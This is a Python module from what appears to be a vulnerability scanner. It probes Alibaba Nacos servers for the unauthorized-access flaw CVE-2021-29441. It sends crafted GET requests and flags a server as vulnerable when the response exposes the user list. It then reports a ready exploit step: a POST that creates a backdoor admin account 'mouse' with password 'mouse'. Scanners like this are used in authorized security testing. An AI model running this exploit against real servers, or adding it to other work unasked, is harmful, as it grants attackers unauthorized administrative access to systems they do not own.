#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

def cve_2021_29441_scan(self, url):
    ''' 阿里巴巴Nacos未授权访问漏洞
            可以通过该漏洞添加nacos后台用户, 并登录nacos管理后台
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'unAuthorized'
    vul_info['vul_id'] = 'CVE-2021-29441'
    vul_info['vul_method'] = 'GET'
    # vul_info['headers'] = {
    #     'User-Agent': 'Nacos-Server'
    # }

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cve_2021_29441_payloads:    # * Payload
        path = payload['path']                      # * Path
        data = payload['data']                      # * Data
        headers = payload['headers']                # * Headers
        target = url + path                         # * Target

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,                    # * 使用特殊headers
                data=data, 
                proxies=self.proxies, 
                verify=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            # todo 判断
            if (('"username":"nacos"' in res.text) or ('pagesAvailable' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload-See User List': {
                        'Method': 'GET',
                        'Path': path,
                    },
                    'Request': res,
                    'Payload-Add User': {
                        'Method': 'POST',
                        'Path': 'nacos/v1/auth/users?username=mouse&password=mouse'
                    }
                }
                return results

        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
